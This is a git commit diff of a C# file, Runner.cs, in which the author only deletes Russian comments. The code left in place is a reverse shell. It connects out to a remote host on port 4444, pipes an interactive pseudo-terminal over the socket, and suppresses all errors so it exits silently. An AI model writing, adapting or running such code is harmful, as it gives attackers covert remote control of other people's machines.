e15d8b3fc2348c5dc5409a4289d6f4563a56ba16
Metivzora <73745791+Metivzora@users.noreply.github.com>
2026-05-18 21:18:45 +0300

    Update Runner.cs

--- Runner.cs
+++ Runner.cs
@@ -1,22 +1,22 @@
 public class ElixRunner {
     public static void Start() {
-        // Настройки подключения
+        
         string host = " "; 
         int port = 4444;
 
         try {
-            // Используем полные имена типов, чтобы не нужны были 'using'
+            
             using (System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(host, port)) {
-                // Запускаем терминал
+                
                 PtyLauncher.Run(client.GetStream(), 80, 24);
                 
-                // Ожидание
+                
                 while (client.Connected) {
                     System.Threading.Thread.Sleep(1000);
                 }
             }
         } catch {
-            // Тихий выход при ошибке
+            
         }
     }
 }
